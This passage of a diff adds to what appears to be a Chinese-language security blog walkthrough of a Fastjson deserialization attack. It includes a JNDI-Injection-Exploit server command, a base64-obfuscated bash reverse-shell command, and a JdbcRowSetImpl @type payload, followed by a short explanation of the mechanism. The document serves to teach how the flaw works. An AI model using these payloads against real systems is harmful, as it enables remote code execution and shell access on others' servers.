@@ -112,3 +112,51 @@ class iphone implements Fruit {
 
 <br>
 
+用JNDI-Injection-Exploit起一个恶意服务器。
+
+<br>
+
+````
+java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ldap://26.119.104.107:1389/1eod9x
+" -a 172.27.112.1
+````
+
+命令执行为
+
+````
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjcuMTEyLjEvMjMxNzIgMD4mMQ==}|{base64,-d}|{bash,-i}
+````
+
+<br>
+
+<img src="https://54huarui.github.io/blogs/fastjson2/1.png" width="880" height="480">
+
+<br>
+
+然后将得到的ldap地址通过com.sun.rowset.JdbcRowSetImpl的
+
+<br>
+
+````
+
+{
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"payload",
+        "autoCommit":true
+    }
+}
+````
+
+<img src="https://54huarui.github.io/blogs/fastjson2/2.png" width="880" height="480">
+
+
+<br>
+
+## 简要说明
+
+<br>
+
+当JSON字符带有一个@type来标记时，反序列化过程中@type会自动加载那个类的set和get方法
+
+所以这个bug就是利用了这个特性去触发了com.sun.rowset.JdbcRowSetImpl中的getdataSourceName方法。这个方法可以加载rmi url达成加载我们的恶意类的目的
